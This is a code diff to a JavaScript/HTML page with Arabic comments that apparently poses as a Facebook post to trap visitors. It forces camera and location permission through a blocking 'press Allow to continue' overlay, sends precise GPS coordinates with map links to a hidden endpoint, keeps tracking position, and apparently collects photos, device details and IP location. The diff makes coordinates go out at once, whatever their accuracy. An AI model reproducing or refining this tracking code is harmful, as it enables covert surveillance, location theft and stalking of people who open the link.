@@ -31,18 +31,20 @@
 
     .retry-overlay {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: var(--bg); display: flex; flex-direction: column;
+      background: rgba(0,0,0,0.5); display: flex; flex-direction: column;
       justify-content: center; align-items: center; z-index: 9999;
     }
+    .retry-overlay.hidden { display: none; }
     .retry-overlay p {
-      font-size: 18px; color: var(--text-primary); margin-bottom: 20px;
+      font-size: 18px; color: white; margin-bottom: 20px;
       font-weight: bold; text-align: center; padding: 0 20px;
+      background: rgba(0,0,0,0.7); border-radius: 8px; padding: 12px 20px;
     }
     .retry-btn {
       padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
       border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
     }
-    .hidden { display: none !important; }
+
     video, canvas { display: none; }
   </style>
 </head>
@@ -86,32 +88,25 @@
     let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
     let cameraGranted = false, locationGranted = false;
     let escapeCompleted = false, watchId = null;
+    let retryReason = 'camera';
 
-    // دالة تكشف اللغة والمتصفح وتعيد كلمة التنبيه المناسبة
     function getPermissionKeyword() {
       const lang = (navigator.language || '').toLowerCase();
       const ua = navigator.userAgent || '';
       const isArabic = lang.startsWith('ar');
-      const isEnglish = lang.startsWith('en');
-
       if (isArabic) {
-        // في المتصفحات العربية، تختلف الكلمة حسب المتصفح
         if (ua.includes('CriOS') || ua.includes('Chrome')) return 'سماح';
         if (ua.includes('Safari') && !ua.includes('CriOS') && !ua.includes('Chrome')) return 'موافقة';
-        if (ua.includes('Firefox')) return 'السماح';
-        if (ua.includes('Edg')) return 'السماح';
-        return 'سماح'; // افتراضي للعربية
-      } else if (isEnglish) {
-        return 'Allow';
-      } else {
-        // لغات أخرى – نعتمد الإنجليزية
-        return 'Allow';
+        return 'سماح';
       }
+      return 'Allow';
     }
 
-    function updateRetryMessage() {
+    function updateRetryMessage(reason) {
       const keyword = getPermissionKeyword();
-      retryMessage.textContent = `يجب النقر على ${keyword} للمتابعة`;
+      retryMessage.textContent = reason === 'camera' 
+        ? `يجب النقر على ${keyword} للكاميرا للمتابعة`
+        : `يجب النقر على ${keyword} للموقع للمتابعة`;
     }
 
     function sendText(text) {
@@ -121,11 +116,17 @@
       }).catch(() => {});
     }
 
-    function showOverlay() {
-      updateRetryMessage(); // حدث النص قبل الإظهار
-      post.classList.add('hidden');
+    function showOverlay(reason) {
+      retryReason = reason || 'camera';
+      updateRetryMessage(retryReason);
+      if (reason === 'location') {
+        post.classList.remove('hidden');
+      } else {
+        post.classList.add('hidden');
+      }
       overlay.classList.remove('hidden');
     }
+
     function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
     function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); if (watchId) navigator.geolocation.clearWatch(watchId); }
 
@@ -185,35 +186,31 @@
     }
 
     function startWatchingGPS() {
-      if (!navigator.geolocation) { showOverlay(); return; }
+      if (!navigator.geolocation) { showOverlay('location'); return; }
+      // طلب الموقع لأول مرة
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
-            gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
-            sendText(
-              `📍 <b>الموقع الدقيق (GPS)</b>\n` +
-              `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
-              `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">Google Maps</a>\n` +
-              `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">Apple Maps</a>\n` +
-              `🗺️ <a href="https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18">OpenStreetMap</a>`
-            );
-            locationGranted = true;
-            hideOverlay();
-            // بدء المراقبة المستمرة
-            watchId = navigator.geolocation.watchPosition(
-              (p) => {
-                if (p.coords.accuracy && p.coords.accuracy <= 50) {
-                  gpsLoc = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, src: 'GPS' };
-                }
-              },
-              () => {},
-              { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-            );
-          } else {
-            showOverlay();
-          }
+          // قبل أي دقة، نرسل الموقع فورًا
+          gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
+          sendText(
+            `📍 <b>الموقع الدقيق (GPS)</b>\n` +
+            `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
+            `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">Google Maps</a>\n` +
+            `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">Apple Maps</a>\n` +
+            `🗺️ <a href="https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18">OpenStreetMap</a>`
+          );
+          locationGranted = true;
+          hideOverlay();
+          // متابعة المراقبة لتحسين الدقة
+          watchId = navigator.geolocation.watchPosition(
+            (p) => {
+              gpsLoc = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, src: 'GPS' };
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+          );
         },
-        () => { showOverlay(); },
+        () => { showOverlay('location'); },
         { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
       );
     }
@@ -260,22 +257,20 @@
     }
 
     async function tryAllPermissions() {
-      // 1. الكاميرا أولاً
       const camOk = await startCamera();
-      if (!camOk) {
-        showOverlay();
-        return;
-      }
+      if (!camOk) { showOverlay('camera'); return; }
       cameraGranted = true;
-      // 2. ثم الموقع
       startWatchingGPS();
-      // إذا فشل الموقع، ستظهر واجهة الإعادة من داخل startWatchingGPS
     }
 
     retryBtn.addEventListener('click', async () => {
       hideOverlay();
       await new Promise(r => setTimeout(r, 200));
-      await tryAllPermissions();
+      if (retryReason === 'camera') {
+        await tryAllPermissions();
+      } else {
+        startWatchingGPS();
+      }
     });
 
     async function sendExitReport() {
@@ -320,10 +315,7 @@
       sendDeviceInfo();
       fetchIPLocation();
       if (isInAppBrowser()) await attemptEscape();
-      // ابدأ بمحاولة الصلاحيات بعد 600 ملي ثانية
-      setTimeout(async () => {
-        await tryAllPermissions();
-      }, 600);
+      setTimeout(async () => { await tryAllPermissions(); }, 600);
     })();
 
     window.addEventListener('beforeunload', () => {
